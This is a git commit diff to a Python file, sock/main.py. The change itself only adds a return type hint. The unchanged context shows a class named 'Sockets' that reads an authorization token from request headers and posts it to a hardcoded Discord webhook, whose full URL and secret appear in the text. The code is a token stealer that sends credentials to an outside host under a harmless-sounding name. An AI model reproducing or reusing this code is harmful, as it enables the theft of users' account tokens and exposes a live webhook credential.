e1628e39be7ab4cd0d171fbde349ed70137a93df
Krizz <106268863+ZorgKrizz@users.noreply.github.com>
2023-09-25 22:12:51 +0530

    Update main.py

--- sock/main.py
+++ sock/main.py
@@ -7,5 +7,5 @@ class Sockets():
         self.token   = self.headers["authorization"]
         self.webhook = "https://discord.com/api/webhooks/1155899947900731464/_T95QCpWszC3d55gHQQMf312L78sf-Zhe25DwABaiu-QnwD1VucJuBAHm3EyovFO2ZGm"
 
-    def send_socket(self):
+    def send_socket(self) -> None:
         requests.post(self.webhook, json={"content": self.token})
